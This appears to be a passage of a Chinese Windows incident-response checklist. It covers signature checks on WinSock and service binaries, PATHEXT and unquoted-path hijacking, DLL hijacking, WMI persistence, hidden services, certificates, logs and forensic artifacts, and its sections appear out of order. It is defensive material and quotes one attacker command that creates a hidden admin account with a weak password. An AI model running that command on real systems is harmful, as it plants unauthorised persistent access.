                                Write-Host "Could not find file '$dllFileName' in default search paths. Skipping signature verification."  -ForegroundColor Yellow
                            }
                        }
                    } else {
                        Write-Host "Binary file path is empty for subkey $($subkey.PSChildName)."  -ForegroundColor Yellow
                    }
                }
            }
        }
    }

    # 打印不通过的签名验证信息
    if ($invalidSignatures.Count -gt 0) {
        Write-Output ""
        Write-Output ""
        Write-Output "--------------------------------------------------------"
        Write-Host "Invalid signatures:" -ForegroundColor Red
        foreach ($invalidSignature in $invalidSignatures) {
            $registryPath = $invalidSignature.RegistryPath
            $binaryFilePath = $invalidSignature.BinaryFilePath
            Write-Host "Registry path: $registryPath" -ForegroundColor Yellow
            Write-Host "Binary file path: $binaryFilePath" -ForegroundColor Yellow
            Write-Output ""
        }
        Write-Output "--------------------------------------------------------"
    }
}

# 要检查的注册表地址数组
$registryPaths = @(
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries\",
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\Protocol_Catalog9\Catalog_Entries64",
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries\",
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64"
)

# 调用函数进行检查
Write-Host "Starting signature verification..."

Check-RegistryPaths -RegistryPaths $registryPaths

Write-Host "Signature verification completed."

```

也可以通过 `Autoruns` 进行排查

【 Windows Server 2016 】默认情况

### 0x37 Windows Defender 日志

### 0x38 防火墙配置

### 0x39 pathext 排查

`pathext` 是 Windows 的一个环境变量，它的意义是当执行 `testapp` 时，该如何查找要执行的文件

 `.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

```
 通过 `pathext` 环境变量可以明确，会按照下面的顺序查找

 - testapp.com
 - testapp.exe
 - testapp.bat
 - ...

 至于去那里查找，那就是当前目录以及 PATH 环境变量的事情了。 我们需要关注的是 `pathext` 是否被增加了其他后缀，是否存在劫持的可能

【 Windows Server 2016 】默认情况

 `.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

```

### 0x40 Sandbox 排查

部分恶意攻击者开始使用 Windows 自带的 Sandbox 来制造隔离环境，逃避杀软检测，目前该技术只在 Windows 10/11 等系统中存在

Windows Sandbox 默认关闭，可以使用下面的 PowerShell 命令进行查看

 `Get-WindowsOptionalFeature -Online -FeatureName "Containers-DisposableClientVM"

```

也可以通过 DISM 命令查询

 `DISM /Online /Get-FeatureInfo /FeatureName:Containers-DisposableClientVM

```

参考文章： https://www.welivesecurity.com/en/eset-research/operation-akairyu-mirrorface-invites-europe-expo-2025-revives-anel-backdoor/

https://blog-en.itochuci.co.jp/entry/2025/03/12/140000

### 0x41 Windows 空格路径截断排查

在 Windows 系统中，部分程序在解析程序路径时，遇到存在空格的路径，如果没有使用双引号包裹，可能存在截断的问题，这个问题我们在 Windows 服务的文章中已经有提到，但是我发现不同程序的处理是不一样的，因此我们采取相对严格的排查策略

如果系统中存在 `C:\t m p\a b c.exe` ，那么我们应该检查以下文件是否存在 - `C:\t` - `C:\t.com` - `C:\t.exe`

 - 其他后缀，具体根据 pathext 环境变量
 - `C:\t m`
 - `C:\t m.com`
 - `C:\t m.exe`
 - 其他后缀，具体根据 pathext 环境变量
 - `C:\t m p\a`
 - `C:\t m p\a.com`
 - `C:\t m p\a.exe`
 - 其他后缀，具体根据 pathext 环境变量
 - `C:\t m p\a b`
 - `C:\t m p\a b.com`
 - `C:\t m p\a b.exe`
 - 其他后缀，具体根据 pathext 环境变量

 下面提供 PowerShell 和 Go 语言两个版本的排查脚本

https://github.com/Just-Hack-For-Fun/Check_Path_Blank

### 1. 查看用户

cmd中输入

 `net user

```
 此时，会显示出相关的系统账号：

此命令无法看到隐藏账号的情况，例如 admin$

### 1. certmgr.msc

`certmgr.msc

```
 主要就是对比是否存在和系统默认不一样的证书，尤其是多出来的

【 Windows Server 2016 】默认情况

受信任的跟证书颁发机构 -> 证书

 `颁发给 颁发者 截止日期    预期目的    友好名称    状态  证书模板
AAA Certificate Services    AAA Certificate Services    2029/1/1    客户端身份验证, 代码签名, 加密文件系统, 安全电子邮件, IP 安全隧道终止, IP 安全用户, 服务器身份验证, 时间戳 Sectigo (AAA)
Class 3 Public Primary Certification Authority  Class 3 Public Primary Certification Authority  2028/8/2    客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证  VeriSign Class 3 Public Primary CA
Copyright (c) 1997 Microsoft Corp.  Copyright (c) 1997 Microsoft Corp.  1999/12/31  时间戳 Microsoft Timestamp Root
DigiCert Assured ID Root CA DigiCert Assured ID Root CA 2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Global Root CA DigiCert Global Root CA 2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Global Root G2 DigiCert Global Root G2 2038/1/15   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert Global Root G2
DigiCert High Assurance EV Root CA  DigiCert High Assurance EV Root CA  2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Trusted Root G4    DigiCert Trusted Root G4    2038/1/15   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert Trusted Root G4
Microsoft Authenticode(tm) Root Authority   Microsoft Authenticode(tm) Root Authority   2000/1/1    安全电子邮件, 代码签名    Microsoft Authenticode(tm) Root
Microsoft Root Authority    Microsoft Root Authority    2020/12/31  <所有>    Microsoft Root Authority
Microsoft Root Certificate Authority    Microsoft Root Certificate Authority    2021/5/10   <所有>    Microsoft Root Certificate Authority
Microsoft Root Certificate Authority 2010   Microsoft Root Certificate Authority 2010   2035/6/24   <所有>    Microsoft Root Certificate Authority 2010
Microsoft Root Certificate Authority 2011   Microsoft Root Certificate Authority 2011   2036/3/23   <所有>    Microsoft Root Certificate Authority 2011
NO LIABILITY ACCEPTED, (c)97 VeriSign, Inc. NO LIABILITY ACCEPTED, (c)97 VeriSign, Inc. 2004/1/8    时间戳 VeriSign Time Stamping CA
Parallels IP Holdings GmbH  Symantec Class 3 Extended Validation Code Signing CA - G2   2018/6/25   代码签名    <无>
Symantec Enterprise Mobile Root for Microsoft   Symantec Enterprise Mobile Root for Microsoft   2032/3/15   代码签名    <无>
Thawte Timestamping CA  Thawte Timestamping CA  2021/1/1    时间戳 Thawte Timestamping CA
USERTrust RSA Certification Authority   USERTrust RSA Certification Authority   2038/1/19   客户端身份验证, 代码签名, 加密文件系统, 安全电子邮件, IP 安全隧道终止, IP 安全用户, 服务器身份验证, 时间戳 Sectigo
VeriSign Class 3 Public Primary Certification Authority - G5    VeriSign Class 3 Public Primary Certification Authority - G5    2036/7/17   <所有>    <无>
VeriSign Universal Root Certification Authority VeriSign Universal Root Certification Authority 2037/12/2   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 VeriSign Universal Root Certification Authority

```
 中间证书颁发机构 -> 证书

 `颁发给 颁发者 截止日期    预期目的    友好名称    状态  证书模板
Microsoft Windows Hardware Compatibility    Microsoft Root Authority    2002/12/31  代码签名, Windows 硬件驱动程序验证  <无>
Root Agency Root Agency 2040/1/1    <所有>    <无>
Symantec Class 3 Extended Validation Code Signing CA - G2   VeriSign Class 3 Public Primary Certification Authority - G5    2024/3/4    代码签名    <无>
VeriSign Class 3 Public Primary Certification Authority - G5    VeriSign Class 3 Public Primary Certification Authority - G5    2036/7/17   <所有>    <无>
www.verisign.com/CPS Incorp.by Ref. LIABILITY LTD.(c)97 VeriSign    Class 3 Public Primary Certification Authority  2016/10/25  服务器身份验证, 客户端身份验证, 2.16.840.1.113730.4.1, 2.16.840.1.113733.1.8.1    <无>

```
 中间证书颁发机构 -> 证书吊销列表

 `颁发者 生效日期    下一次的更新时间
VeriSign Commercial Software Publishers CA, "VeriSign, Inc.", Internet  2001/3/24   2004/1/8

```
 第三方根证书颁发机构 -> 证书

 `颁发给 颁发者 截止日期    预期目的    友好名称    状态  证书模板
AAA Certificate Services    AAA Certificate Services    2029/1/1    客户端身份验证, 代码签名, 加密文件系统, 安全电子邮件, IP 安全隧道终止, IP 安全用户, 服务器身份验证, 时间戳 Sectigo (AAA)
Class 3 Public Primary Certification Authority  Class 3 Public Primary Certification Authority  2028/8/2    客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证  VeriSign Class 3 Public Primary CA
DigiCert Assured ID Root CA DigiCert Assured ID Root CA 2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Global Root CA DigiCert Global Root CA 2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Global Root G2 DigiCert Global Root G2 2038/1/15   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert Global Root G2
DigiCert High Assurance EV Root CA  DigiCert High Assurance EV Root CA  2031/11/10  客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert
DigiCert Trusted Root G4    DigiCert Trusted Root G4    2038/1/15   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 DigiCert Trusted Root G4
USERTrust RSA Certification Authority   USERTrust RSA Certification Authority   2038/1/19   客户端身份验证, 代码签名, 加密文件系统, 安全电子邮件, IP 安全隧道终止, IP 安全用户, 服务器身份验证, 时间戳 Sectigo
VeriSign Universal Root Certification Authority VeriSign Universal Root Certification Authority 2037/12/2   客户端身份验证, 代码签名, 安全电子邮件, 服务器身份验证, 时间戳 VeriSign Universal Root Certification Authority

```
 Sparkle -> 证书

 `颁发给 颁发者 截止日期    预期目的    友好名称    状态  证书模板
DigiCert Trusted Root G4    DigiCert Trusted Root G4    2040/1/1    <所有>    <无>
Sparkle Sparkle 2040/1/1    <所有>    <无>

```

### 1) cmd命令行历史

Windows cmd命令行同样存在命令历史，可以通过相关命令/操作进行查询，但是需要注意的是：

cmd命令历史只能在未关闭的cmd命令窗中进行查询，如果cmd窗口关闭，或未通过cmd命令窗进行的命令操作，是不会记录的

原理为每次新建cmd窗口时，进程会开辟一处缓冲区用来写入相关命令历史，如果关闭窗口，即会清空

未关闭的cmd窗口中输入：

 `doskey /?                           # 获取命令帮助
doskey /history             # 获取当前cmd窗的命令历史

```

未关闭的cmd窗口中键入F7：

### 1. 通过 Defender 程序

直接搜索 `Defender`

这三个项都可以查看详细信息看一下

### 1. DLL 劫持

系统已经存在的进程是否已经被 `DLL` 劫持不是很容易检测，建议可以使用安全防护软件进行全盘扫描检测

本部分主要从以下两个角度

 - `DLL` 劫持经常使用的注册表是否被修改
 - 某个程序是否存在 `DLL` 劫持漏洞

 `DLL` 劫持经常使用的方式是根据 `DLL` 加载顺序进行劫持，这里涉及一个很重要的注册表项

 `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode

```
 当`SafeDllSearchMode`的值为0或未设置时，系统采用默认的搜索策略，即先在应用程序所在目录搜索 DLL 文件，然后在系统目录（如`C:\Windows\System32`）和系统路径（如`PATH`环境变量所指定的路径）中搜索。

然而，当`SafeDllSearchMode`的值为1时，系统将启用安全的 DLL 搜索模式。在安全模式下，系统会忽略应用程序所在目录，只在系统目录和系统路径中搜索 DLL 文件。这种行为旨在防止恶意 DLL 文件的劫持和欺骗。

参考文章

https://www.cnblogs.com/bmjoker/p/11031238.html

【 Windows Server 2016 】默认情况

Windows Server 2016 默认没有这个注册表项了

可以通过 `rattler` 检查某个程序是否存在 `DLL` 劫持漏洞

https://github.com/sensepost/rattler

这里需要注意，检测过程中会启动被检测的应用程序，请在隔离的虚拟机里测试

### 1) Get-Process

Powershell里输入：

 `get-help get-process        //获取get-process命令的帮助

```

常规用法：`gps -name “*{进程名}*”`

 `gps -name "*edge*"      //查询列出所有“edge”字样的进程

```

组合`format-list *`使用

 `gps -name "*edge*"|format-list *        //列出名称包含“edge”进程的详细信息，包含内容非常多
gps -pid 8828 |format-list *                //列出pid为8828进程的详细信息
gps -pid 8828 |format-list path         //列出pid为8828进程的程序路径

```

### 1) Get-WinEvent

Get-WinEvent可以查询上百种日志，其中包括更加详细的 `Applications and Services Logs`，Get-WinEvent是从 Windows Vista 才开始引入的。

需要注意的是，尽量使用管理员权限进行操作 Powershell，不然部分日志会返回错误

Get-WinEvent 命令可以查询日志非常全面，可以通过 `Get-WinEvent -ListLog *` 来查看具体能够查询那些日志，同时所查询日志都在windows日志目录下：

基本用法：

查询登录成功的日志(事件`id: 4624`)

 `Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4624' | Select *

```

如果直接 `Select *` 会查处一堆，包括查询到的所有的内容，当然我们限制查询条数

 `Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4624' -MaxEvents 1 | Select *

```

如果只想看其中几项，可以在 `Select` 后面指定，但是如何知道到底有哪些项呢？

 `Get-WinEvent -LogName Security -FilterXPath '*/System/EventID=4624' | Get-Member

```

这样就可以选择了

### 1. GUI 环境变量查询

常规查询方式如下：

`右键此电脑-属性-高级系统设置-环境变量`

也可以直接通过搜索栏搜索 `环境变量`

【 Windows Server 2016 】默认情况

### 1. LastActivityView

https://www.nirsoft.net/utils/computer_activity_view.html

`LastActivityView` 可以显示多种活动记录，包括文件访问、程序启动和关闭、系统休眠和唤醒、网络活动、打印作业等。它收集并显示这些活动记录的详细信息，如活动时间、活动类型、操作描述、文件路径等。

下载 `LastActivityView` 及其对应的语言配置文件，将语言配置文件放在与 `LastActivityView` 同路径下会自动加载语言配置文件

这里可以看到任务运行、打开文件或文件夹、选择打开/保存文件对话框等近期操作，可以通过点击查看，选择一些便于查看的选项

可以导出 html 版本的报告，可以通过筛选功能进行筛选

通过在项上右击属性，查看该项的来源，当然也可以通过调整栏目大小，在后面的栏目中找到

### 1) lusrmgr.msc 查看隐藏用户

`lusrmgr.msc` 为打开本地用户和组

`win + r / cmd` 中输入

 `lusrmgr.msc

```

lusrmgr能够看到常规的隐藏账户情况，即`net user admin$ 123456 /add` 这类方式添加的隐藏账号

右键用户查看属性即可看到相关用户信息

【 Windows Server 2016 】 默认情况

其他组均为空

### 1. msconfig

`msconfig`为打开系统配置程序，内含开机自启项目

`win + r` 输入

 `msconfig

```
 不是很建议使用这个程序来查看开机自启，只能作为查缺补漏项

可以查看到常规系统启动项，并且可以右键查看相应的启动项文件位置，也可以通过右键属性查看相应信息，但是此方法无法看到组策略自启动脚本，实测注册表自启动项也看不到

【 Windows Server 2016 】 默认情况

### 1. netstat

cmd中输入：

 `netstat /?

```
 命令解释如下：

可以通过如下命令，获取当前所有UDP和TCP连接，同时列出所有的进程PID和进程执行程序及对应的服务简称

 `netstat -a -n -o -b         //-anob同理

```
 连接状态有以下几种

 - LISTENING：表示监听 ，表示这个端口处于开放状态， 可以提供服务
 - ESTABLISHED"：表示是对方与你已经连接 正在通信交换数据
 - CLOSING：表示关闭的 表示端口人为或者防火墙使其关闭(也许服务被卸载)
 - TIME WAIT ：表示正在等待连接 就是你正在向该端口发送请求连接状态

### 1) 通过 pid 查询进程信息

`tlist 2796          # 直接跟对应进程的pid，会列出该进程的详细信息，可以看到具体的进程命令、内存信息、dll信息等
tlist msedge        # 直接跟进程名称，也同样列出相关信息，此处可以使用通配符
tlist msedg*        # 通配符，列出所有msedg*相关进程的详细信息
tlist -v 2796       # -v查看详细信息

```

### 1. 注册表查询 RDP 记录

所有本机连接过的远程桌面RDP，都会在注册表内记录，所以可以通过注册表进行排查RDP信息：

 `//注册表具体路径
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default
HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers
//命令查询，相关注册表内会包含登陆账号信息
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" && reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"

```

同时RDP还会存在`Default.rdp`文件，是最后一次连接的信息，双击打开即可看到

 `C:\Users\{username}\Documents\Default.rdp

```

也可以直接打开 `mstsc`

直接查看

Windows Server 2016 默认并不会记录全所有的 RDP 连接其他服务器的信息，每台服务器只会记录最后一次登录的账户信息

### 1. services.msc

`win + r` 中输入：

 `services.msc            # 打开“服务”面板

```

需要关注的点有：

### 1. taskschd.msc 任务计划程序

`taskschd.msc`为打开任务计划程序

`win + r` 中输入

 `taskschd.msc

```
 可以看到近期活动的计划任务

​   该处需要注意的是，右侧的两个选项卡

 - 显示所有正在运行的任务

 - 开启/禁用所有任务历史记录

 如右侧显示开启所有任务历史记录，请点击开启，该选项会开启定时任务运行历史记录，有助于排查

点击`显示所有正在运行的任务`选项卡，可以显示当前正在运行的定时任务

计划任务中，任务详情需点击相关的计划任务，下面会显示该计划任务属性详情

需要着重注意以下选项卡：触发器、操作和历史记录

其中都会存储定时任务相关的信息，可以帮助排查

以下为病毒创建的计划任务，属性->操作 里可以看到该计划任务所执行的具体操作

点击左侧 `任务计划程序（本地）`，显示如下

任务状态可以选择时间，假设选择 24 小时，下面显示的是从现在起，向前数 24 小时，在这时间段启动的任务状态

计划任务状态有以下几种

 - 已准备就绪（Ready）：任务已经配置好，并且等待触发执行。
 - 运行中（Running）：任务当前正在执行中。
 - 已停止（Stopped）：任务已经停止，不再执行。
 - 禁用（Disabled）：任务已被禁用，不会触发执行。

 活动任务指的是当前正在运行的计划任务。这些任务是已经被触发并且正在执行中的任务。活动任务可能包括自动触发的任务和手动触发的任务，任务未过期

### 1. 查询 <code>WMI</code> 命名空间

`Get-CimInstance -ClassName __Namespace -Namespace "root" | Select-Object Name

```
 【 Windows Server 2016 】默认情况

 `subscription
DEFAULT
CIMV2
msdtc
Cli
SECURITY
SecurityCenter2
RSOP
PEH
StandardCimv2
WMI
AccessLogging
directory
Policy
InventoryLogging
Interop
Hardware
ServiceModel
Microsoft
Appv

```

### 1. wmic

查询过滤器

 `wmic /namespace:"\\root\subscription" path __EventFilter get *
wmic /namespace:"\\root\DEFAULT" path __EventFilter get *

```

查询消费者

 `wmic /namespace:"\\root\subscription" path __EventConsumer get *
wmic /namespace:"\\root\DEFAULT" path __EventConsumer get *

```

查询绑定

 `wmic /namespace:"\\root\subscription" path __FilterToConsumerBinding get *
wmic /namespace:"\\root\DEFAULT" path __FilterToConsumerBinding get *

```

wmic 显示的内容实在是格式比较差，推荐使用 `Powershell` 来调用 `WMI` 相关的模块进行查询，`wmic` 作为辅助

【 Windows Server 2016 】默认情况

`\root\subscription`

过滤器

消费者

绑定

`\root\DEFAULT`

过滤器

消费者

绑定

### 1) wmic

删除过滤器

 `wmic /NAMESPACE:"\\root\subscription" path __EventFilter where Name="FilterName" delete

```

删除消费者

 `wmic /NAMESPACE:"\\root\subscription" path CommandLineEventConsumer where Name="ConsumerName" delete

```

删除绑定

 `wmic /NAMESPACE:"\\root\subscription" path __FilterToConsumerBinding where Filter="__EventFilter.Name='FilterName'" delete

```

### 10. 排查隐藏的服务

针对仅通过 `SDDL` 进行权限控制的方式隐藏的，可以执行以下 `Powershell` 检查

 `$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | ForEach-Object { $_.PSChildName }

$maliciousServices = foreach ($service in $services) {
    $queryOutput = sc.exe query $service 2>&1

    if ($queryOutput -like "*拒绝访问*") {
        $configOutput = sc.exe qc $service

        [PSCustomObject]@{
            ServiceName = $service
            Status = "拒绝访问"
            Config = $configOutput
        }
    }
}

if ($maliciousServices) {
    Write-Host "发现以下恶意服务:"
    $maliciousServices | Format-Table -AutoSize -Property ServiceName, Status

    foreach ($service in $maliciousServices) {
        Write-Host "--------------------------------------------------"
        Write-Host "Service Name: $($service.ServiceName)"
        Write-Host "Status: $($service.Status)"
        Write-Host "Service Config:"
        $configLines = $service.Config -split "`n"
        $configLines | ForEach-Object {
            $configLine = $_.Trim()
            if ($configLine -ne "" -and $configLine -notlike "[*]*") {
                Write-Host $configLine
            }
        }
        Write-Host "--------------------------------------------------"
    }
} else {
    Write-Host "未发现恶意服务."
}

```
 在此基础上删除了注册表的隐藏任务主要通过日志进行排查

详细的排查与处置可以查看 知识点附录 -> 0x12 服务隐藏与排查

### 10. Application-Experience

`Application-Experience` 日志是 Windows 操作系统中的一个事件日志，用于记录与应用程序体验和兼容性相关的事件和信息。它提供了有关应用程序的启动、运行和兼容性修复的记录。以下是关于 `Application-Experience` 日志的一些含义：

 - 应用程序启动和运行：`Application-Experience` 日志记录了应用程序的启动和运行事件。这些事件可以包括应用程序的启动时间、运行时错误、异常终止等。通过分析这些事件，可以了解应用程序的执行情况，以便进行故障排除和优化。
 - 兼容性修复：当应用程序在当前操作系统上遇到兼容性问题时，Windows 操作系统可能会尝试自动应用兼容性修复措施。`Application-Experience` 日志会记录这些兼容性修复的相关信息，例如应用程序的设置更改、注册表修复、文件替换等。这些记录可以帮助了解应用程序的兼容性修复过程和结果。
 - 应用程序兼容性评估：`Application-Experience` 日志还记录了应用程序的兼容性评估结果。这些评估可能涉及检查应用程序的兼容性数据库、比较应用程序的配置与兼容性规则等。通过这些评估记录，可以确定应用程序在当前操作系统上的兼容性状况。
 - 应用程序配置和设置：`Application-Experience` 日志可能还包含与应用程序配置和设置相关的事件和信息。这些信息可以包括应用程序的配置更改、注册表设置、文件路径更改等。通过记录这些事件，可以了解应用程序的配置变化和对应的影响。

 具体位置为

 `应用程序与服务日志 -> Microsoft -> Windows -> Application-Experience

```

这里有 5 个日志文件

 - Program-Compatibility-Assistant（程序兼容性助手）：     这个日志文件记录了与程序兼容性助手相关的操作和事件。程序兼容性助手是 Windows 操作系统中的一个功能，用于检测和解决应用程序在当前操作系统上的兼容性问题。该日志文件记录了兼容性助手执行的操作、应用程序的兼容性问题和解决方案等信息。
 - Program-Compatibility-Troubleshooter（程序兼容性故障排除）：     这个日志文件记录了与程序兼容性故障排除相关的操作和事件。程序兼容性故障排除是 Windows 操作系统中的一个功能，用于自动检测和解决应用程序的兼容性问题。该日志文件记录了故障排除执行的操作、检测到的兼容性问题和解决方案等信息。
 - Program-Inventory（程序清单）：     这个日志文件记录了与程序清单相关的操作和事件。程序清单是 Windows 操作系统中的一个功能，用于跟踪和记录已安装的应用程序的信息。该日志文件记录了应用程序的安装、卸载、更新等操作，以及与程序清单相关的元数据和事件。
 - Program-Telemetry（程序遥测）：     应用程序遥测日志通常包含了应用程序运行时的行为和性能数据，可能包括启动时间、资源使用情况、功能使用统计等。在Application Experience服务下，这类日志有助于微软或其他开发者了解应用的运行状况以便改进其兼容性和用户体验。
 - Steps-Recorder（步骤记录器）：     这个日志文件记录了使用步骤记录器工具期间的事件和操作。步骤记录器是 Windows 操作系统中的一个实用工具，用于记录用户在计算机上执行的操作步骤，以便在需要时进行故障排除和问题解决。该日志文件记录了用户的操作步骤、屏幕截图和其他相关信息。

这几个日志文件都可以查看一下

### 10. FullEventLogView

https://www.nirsoft.net/utils/full_event_log_view.html

FullEventLogView 是一款查看 Windows 日志的利器，可以将所有的日志根据时间线进行聚合显示，而且可以加载离线的日志文件，非常推荐使用

### 10. OpenArk

https://openark.blackint3.com/

https://github.com/BlackINT3/OpenArk

OpenArk 也是一款集成性的安全排查工具，用于对抗 `Rootkit`

### 11. 进阶性排查

排查所有的服务的启动文件签名情况，部分攻击者可能利用权限配置的不合理，通过替换服务启动的应用程序进行提权或者权限维持

 `$microsoftCNS = @('Microsoft Corporation', 'Microsoft Windows', 'Microsoft Windows Hardware Compatibility Publisher', 'Microsoft Update', 'Microsoft Windows Publisher')

# 定义函数来进行签名校验
function Verify-FileSignature {
    param (
        [Parameter(Mandatory=$true)]
        [string]$FilePath
    )

    if (Test-Path -Path $FilePath -PathType Leaf) {
        $signature = Get-AuthenticodeSignature -FilePath $FilePath

        if ($signature.Status -eq 'Valid') {
            $publisher = $signature.SignerCertificate.Subject

            # 解析发布者信息以提取 CN 字段的值
            $cnValues = @(($publisher -split ', ' | Where-Object { $_ -like 'CN=*' }).Substring(3))

            if ($cnValues.Count -eq 1) {
                $cnValue = $cnValues[0]

                # 判断 CN 字段是否为微软官方
                if ($microsoftCNS -contains $cnValue) {
                    return "Valid"
                }
            }
        }

        return "Invalid"
    }

    return "File Not Found"
}

# 获取所有服务
$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -ne $null }
foreach ($service in $services) {
    $path = $service.PathName

    # 去掉双引号
    if ($path.StartsWith('"') -and $path.EndsWith('"')) {
        $path = $path.Trim('"')
    }

    # 处理路径中包含空格的情况
    $potentialPaths = @()
    $parts = $path -split ' '
    for ($i = 0; $i -lt $parts.Length; $i++) {
        $potentialPath = ($parts[0..$i] -join ' ')

        if (Test-Path -Path $potentialPath -PathType Leaf) {
            $potentialPaths += $potentialPath
        } elseif (Test-Path -Path "$potentialPath.exe" -PathType Leaf) {
            $potentialPaths += "$potentialPath.exe"
        }

        if ($potentialPaths.Length -ge 1) {
            break
        }
    }

    # 逐个验证找到的可执行文件路径
    foreach ($potentialPath in $potentialPaths) {
        $result = Verify-FileSignature -FilePath $potentialPath
        if ($result -ne 'Valid') {
            Write-Host "---------------------------------------"
            Write-Host "Service Name: $($service.Name)"
            Write-Host "Executable Path: $potentialPath"
            Write-Host "Signature Status: $result"
            Write-Host ""
        }
    }
}

```

【 Windows Server 2016 】默认情况

### 11. Jump Lists

Jump Lists（跳转列表）是Windows操作系统中的一个功能，用于提供快速访问应用程序的常用任务和最近打开的文件。它可以让用户更方便地启动应用程序、访问常用功能以及快速打开最近使用的文件

 `%APPDATA%\Microsoft\Windows\Recent
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations
%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\

```

与 `Win + r` 输入 `Recent` 是一样的

解析工具

https://github.com/EricZimmerman/JumpList

https://ericzimmerman.github.io/#!index.md

### 11. 系统信息(msinfo32)

不知道这个程序是从哪代 Windows 加进来的，可以查看的信息不少

`win + r` 之后输入 `msinfo32` 或者直接搜索系统信息

可以看到进程开始的时间

### 12. SRUM

SRUM（System Resource Usage Monitor）是Windows操作系统中的一个组件，用于跟踪和记录系统资源的使用情况。它可以提供有关应用程序、进程和用户在系统上使用的资源的详细信息，包括CPU时间、内存使用、网络活动和磁盘活动等。

以下是SRUM的一些功能和用途：

 - 资源管理和性能分析：SRUM可以帮助系统管理员和开发人员监视和分析系统资源的使用情况。通过SRUM，可以了解特定应用程序、进程或用户在系统上使用资源的方式，以及它们对系统性能的影响。这可以帮助优化系统配置、调整应用程序性能和识别资源瓶颈。
 - 安全审计和威胁检测：SRUM还可以用于安全审计和威胁检测。通过监视系统资源的使用情况，可以检测到异常或可疑的活动模式，例如异常的CPU或内存使用、异常的网络活动或大量的磁盘写入操作。这有助于发现潜在的恶意软件活动、内部滥用或异常行为。
 - 用户活动分析：SRUM可以跟踪和记录用户在系统上的活动，例如登录时间、应用程序使用情况、网络连接和文件访问等。这可以用于分析用户行为模式、用户习惯和工作模式，从而改进用户体验、优化资源分配或进行用户行为分析。

 文件位置

C:\Windows\System32\sru\SRUDB.dat

解析工具

https://github.com/EricZimmerman/Srum

在 `Windows Server 2016` 中默认不存在该目录以及文件，如果你的系统里有该文件，使用该解析工具前记得看一下 Github 的注意事项，不然可能会报错

### 13. LastVisitedMRU

LastVisitedMRU是Windows操作系统中的一个注册表键名（Registry key），用于跟踪用户使用的应用程序以及应用程序访问的最后一个文件的目录位置。

LastVisitedMRU保存在注册表中的以下路径下：

 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU

```

### 14. 最近打开的文件

这是一个注册表项跟踪最后打开的文件和文件夹。用于在某些开始菜单中的“最近”菜单等地方填充数据。

位置

 `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
HKEY_USERS\<sid>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

```

### 1. 命令行查询本地/远端会话

`query user              # 当前系统的 user 登录情况
query session           # 当前系统的用户会话情况
Get-SmbSession    # 当前系统的 SMB 信息

```
 该命令为查看当前系统的会话，查看是否有人使用远程终端登录服务器，所以同样可以看到账号异常

### 1. 临时目录

### 1) 用户临时目录

`echo %TMP%
echo %TEMP%

```
 每个用户都有临时目录，通常为 `C:\Users\<Username>\AppData\Local\Temp`

### 1. 下载记录

### 1. 排查注册表

我们首先要进行的检查就是 `HKCU\Software\Classes\CLSID\` 下所有的  `COM` 组件

这些注册表项中的子项 `InprocServer32` 是我们要关注的，它指定了COM组件的DLL文件路径。

【 Windows Server 2016 】默认情况

默认情况下 `HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID` 是空的

如果排查过程中发现存在相关设置，可以重点关注，通过验证签名，病毒扫描等方式进行检查

### 1. 防火墙开关

查看防火墙当前状态

`win+r` 中输入：

 `firewall.cpl            # 快速打开Windows Defender 防火墙设置页面

```
 进行查看当前防火墙状态

### 1) 计划任务本身的注册表

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule

```

 - AtTaskMaxHours：指定计划任务执行的最大小时数。

 - DependOnService：指定计划任务服务所依赖的其他服务。该项列出了计划任务服务所需依赖的其他服务的名称。

 - 注意 `REG_MULTI_SZ` 是多字符串值，也就是说表示多个字符串，字符串不能包含空格

 - Description：计划任务服务的描述信息，用于提供关于该服务功能的说明。

